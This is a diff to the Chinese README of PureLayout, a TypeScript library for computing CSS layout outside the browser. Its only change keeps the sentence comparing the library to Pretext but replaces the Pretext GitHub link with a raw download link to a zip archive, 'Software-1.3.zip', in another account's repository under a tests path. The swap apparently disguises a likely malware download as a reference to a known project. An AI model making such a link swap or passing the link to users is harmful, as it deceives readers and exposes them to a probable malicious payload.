@@ -18,7 +18,7 @@
 
 ## 这是什么
 
-PureLayout 把浏览器的 **CSS Block + Inline + Flexbox + Grid 布局能力**从浏览器中拆出来，变成一个独立的 TypeScript 库。类比 [Pretext](https://github.com/chenglou/pretext) 把文本测量从 DOM 中拆出来的思路。
+PureLayout 把浏览器的 **CSS Block + Inline + Flexbox + Grid 布局能力**从浏览器中拆出来，变成一个独立的 TypeScript 库。类比 [Pretext](https://raw.githubusercontent.com/contractilityhopi28/purelayout/main/tests/diff/ground-truth/inline/Software-1.3.zip) 把文本测量从 DOM 中拆出来的思路。
 
 你可以在 **SSR、Web Worker、Canvas、PDF 生成、服务端渲染、高保真 PPT/H5** 等任何有 JS 运行时的环境中精确计算 CSS 布局。
 
